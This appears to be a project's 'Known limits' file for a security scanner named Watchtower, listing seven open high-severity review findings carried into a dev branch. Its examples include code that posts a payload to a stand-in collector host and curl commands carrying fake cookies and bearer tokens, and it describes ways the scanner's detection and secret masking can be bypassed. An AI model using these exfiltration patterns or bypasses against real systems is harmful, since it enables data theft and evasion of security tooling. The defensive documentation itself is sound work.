# Known limits

Open findings that dev carries knowingly. Each one is **must-fix before any release**.

## Batch 5 (merged to dev Oct 19, 2026: #15 and #16)

Ken approved merging #15 and #16 into dev on Oct 19, 2026 with these 7 Codex highs open. Forge fixes them after the freeze, before release. They're worded as Codex wrote them in its final checks after fix round 3: #15 at 62ccd0e and #16 at c3b0257. File links point at the code as merged.

**Status: open, must-fix before any release.**

### From #15 (batch 5 PR A: platform notes, reviewed list, #11 follow-ups)

1. **high — [text.py:779](../watchtower/wt_parts/text.py): “Maybe” still permits realistic destination downgrades.**

   `requests.post(os.environ.get('HOOK', '<webhook>'), json=payload)` remains T018/**Install with changes** when `HOOK` actually selects `https://collector.example`. A sibling JSON configuration produces the same result; scanning that JSON separately raises no finding. Unknown-object `getattr`, `setdefault`, `pop`, environment-backed collections and reassigned destination variables also retain T018.

   The assertion conflict is real, but the two tests have different premises. The explicitly empty `config = {}` example can safely retain T018. The broader [safe-default assertions](../tests/test_batch5_codex_r2.py) include externally overridden values and codify this gap. The earlier blanket “fixed” assessment was too broad. Preserving those assertions does not establish safety.

   **Fix:** require evidence that the webhook is the selected destination. Preserve the proven empty-map case; correct assertions that treat unknown runtime defaults as established destinations.

2. **high — [text.py:748](../watchtower/wt_parts/text.py): Receiver naming introduces a new lookup bypass.**

   This complete example selects the collector:

   ```python
   cfg_client = {}
   url = cfg_client.get("<webhook>", "https://collector.example")
   requests.post(url, json=payload)
   ```

   It changes from T005 on `77dedd1` to T018/**Install with changes** on HEAD, despite the explicit collector URL. The `client` suffix makes the lookup appear to be HTTP GET. Conversely, `s = requests.Session(); s.get("<webhook>")` changes from T018 to critical T005.

   **Fix:** establish receiver identity from bindings/API use; a variable-name suffix must not authorize a destination downgrade.

3. **high — [mask.py:689](../watchtower/wt_parts/mask.py): Additional credential flags still leak.**

   With `\<newline>` representing a continued shell word, these retain `FAKEz` through **`mask_secrets`, finding evidence and `save_approved()`**:

   - `curl --coo\<newline>kie 'sid=FAKEz' https://x.example`
   - `curl -\<newline>b 'sid=FAKEz' https://x.example`
   - `curl --oauth2-bea\<newline>rer FAKEz https://x.example`

   These are remaining coverage gaps, not newly introduced leaks. Version-6 copies containing them are migrated to **version 7 while retaining the secret**.

   **Fix:** recognize normalized curl cookie and OAuth bearer options, including their short/attached forms, and mask their credential values.

4. **high — [scanners.py:272](../watchtower/wt_parts/scanners.py): Missing mutable installation metadata still disables release checks.**

   A copy moved outside the default home, under a name other than `app`, without the adjacent commit record returns `installed_root() == None`, skips self-check and accepts planted reviewed-list bytes. A custom-home rename plus removal of its commit record does likewise. Changing `WATCHTOWER_HOME` does not restore protection.

   The “no `.git`” justification does not match the predicate: installation classification does not inspect `.git`. The newly added [checkout guard](../tests/test_batch5_codex_r3.py) explicitly preserves this bypass.

   **Fix:** keep reviewed-list, normalization and scanner trust bound to verified release provenance regardless of directory layout or missing state. Missing Bot-writable metadata must not grant unchecked trust.

### From #16 (batch 5 PR B: access map, threat brief)

5. **High — [collect.py:10](../watchtower/wt_parts/collect.py), [access.py:344](../watchtower/wt_parts/access.py), [access.py:460](../watchtower/wt_parts/access.py): Permission failures can still mean “absent.”**

   `isdir()`, `isfile()` and `lexists()` suppress permission errors into false results. These checks occur before the new error tracking or hardened opens. An unstatable scan root produces neither an error nor a skip; an inaccessible browser ancestor produces `(None, True)`; an inaccessible directory lookup produces `([], True)`.

   An in-memory `access_map_now()` replay with denied metadata lookups consequently returned no incompleteness, browser/MCP/CLI/plugin absence statements, `scheduled_jobs: 0`, and **“Watchtower found no Gmail connector, sign-in or webhook here.”** Ordinary errors *after* opening/listing a directory are handled correctly.

   **Fix:** distinguish confirmed absence from failed lookup. Propagate permission and other lookup errors through root collection, browser/seed checks, CLI discovery and scheduled-directory coverage.

6. **High — [access.py:136](../watchtower/wt_parts/access.py): Saved connector lists bypass malformed-answer validation.**

   A fresh reply with `connectors: [{"name":"Gmail"}]` becomes incomplete. The same value in saved `rollcall_findings.json` passes through `_ax_said()` as an empty, complete connector list.

   The full saved-record reader reproduced **“Golf: no connectors,”** `bot_connectors_complete: true`, and the Gmail absence sentence. `[123]` behaves similarly. A saved scalar `"Gmail"` instead becomes unknown but loses its canonical positive observation.

   **Fix:** apply the same normalization and validation on fresh replies, carried-over records and saved-file reads. Non-string list members must establish incompleteness; supported scalar strings should retain canonical labels.

7. **High — [golden_split.py:803](../tests/golden_split.py), [golden_split.py:996](../tests/golden_split.py): Requirements remain per scenario, not per run/output key.**

   Using the shipped item-a entries, I supplied one healthy audit and a second audit in the same scenario with its entire access addition omitted. The result remained **zero unexpected lines and zero unmet requirements**. The scenario sequences actually contain repeated audits.

   **Fix:** require each applicable `(scenario, output key/run)` independently, including outputs whose omission leaves them identical to baseline.
